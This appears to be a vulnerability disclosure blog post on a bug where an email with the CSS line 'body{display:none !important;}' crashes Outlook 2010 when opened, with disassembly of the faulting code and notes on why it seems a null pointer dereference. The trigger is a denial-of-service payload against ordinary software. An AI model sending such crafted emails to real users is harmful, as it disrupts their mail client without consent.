When you send this email to someone, when he/she *just read* the email, Outlook will crash. MSRC told me that they think it's a non-exploitable bug and it seems that they are not going to fix it in near future, I'm releasing the details in this quick write-up, and hopefully, for an "old pedant" style open discussion about the exploitability as I still have some doubts.:-)

The PoC could be as simple as the following, or you may download the .eml file below.

If you do some tests based on the PoC you will quickly figure out that the CSS code "<style>body{display:none !important;}</style>" is something important here. For example, if we remove this line, Outlook won't crash. This also suggests that the bug is related to some "CSS rendering" code in Outlook.


The Crash

The following crash should be observed on Office 2010 14.0.7177.5000, full updated as of March 21, 2017. In fact, I believe it affects all Outlook versions.

It crashes at the following address:

.text:31B417D2 loc_31B417D2: ; CODE XREF: sub_31714D18+42CB1Ej
.text:31B417D2 lea eax, [ebp+var_1DC]
.text:31B417D8 push eax
.text:31B417D9 push [ebp+var_4]
.text:31B417DC push ebx
.text:31B417DD call sub_3177CE19                          ;memory data at eax will be updated
.text:31B417E2 mov ecx, [eax+48h]                           ;read the pointer at offset 0x48
.text:31B417E5 test dword ptr [ecx+2E4h], 400h      ;crash


Since the data pointed by EAX (@31B417E2) will be updated in function "sub_3177CE19", I did some debugging in that function, and it seems that:
There seems to be a custom heap allocator, as I've seen heap block headers, and links.
The "sub_3177CE19" does the job locating the data based on the 1st param (a pointer) and 2nd param (always be 0), and the data will be copied to the heap block pointed by the 3nd param.
According to my tests, the copied bytes are always 0x00, so that's why it seems to be a null pointer dereference bug.
